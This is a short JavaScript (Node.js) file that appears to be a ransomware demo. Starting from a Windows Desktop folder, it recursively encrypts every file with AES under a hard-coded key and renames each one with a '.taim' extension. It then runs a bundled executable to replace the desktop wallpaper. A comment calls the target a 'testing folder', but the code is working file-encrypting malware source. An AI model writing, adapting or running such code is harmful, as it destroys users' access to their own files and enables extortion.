strict: false
const fs = require('fs')
const path = require('path')
const AES = require('aes-encryption')
const cp = require('node:child_process')
const promisify = require('node:util')
const aes = new AES()

aes.setSecretKey('WnZq4t7weThWmZq3KbPeShVm*G-KaPdSz%C*F-Ja6w9z$C&Fp3s6v9y$VkXp2s5vdRgUkXn2J@NcRfUj')

const execFile = promisify.promisify(cp.execFile);
async function setWallpaper() {
    const binary = path.join(__dirname, 'windows-wallpaper.exe')
    await execFile(binary, [path.join(__dirname, 'bg.png')]);
}

const crawlerLoop = () => {
    let cwd = process.cwd()
    let root = fs.readdirSync(cwd)
    root.forEach((i) => {
        fs.stat(path.join(cwd, i), (err, stats) => {
            if(err){}
            if (stats.isFile()) {
                try {
                    const data = fs.readFileSync(path.join(cwd, i))
                    const encrypt = aes.encrypt(data)
                    fs.writeFileSync(path.join(cwd, i), encrypt)
                    fs.renameSync(path.join(cwd, i), path.join(cwd, `${i}.taim`))
                } catch (e) {

                }

            }
            if (stats.isDirectory()){
                process.chdir(path.join(cwd, i))
                crawlerLoop()

            }
        })
    })
}


const crawl = async () => {
    //this is the root of your testing folder...tweak as needed 
    const BASE_DIR = 'C:\\Users\\user\\Desktop'
    process.chdir(BASE_DIR)
    crawlerLoop()
    await setWallpaper()
}
crawl()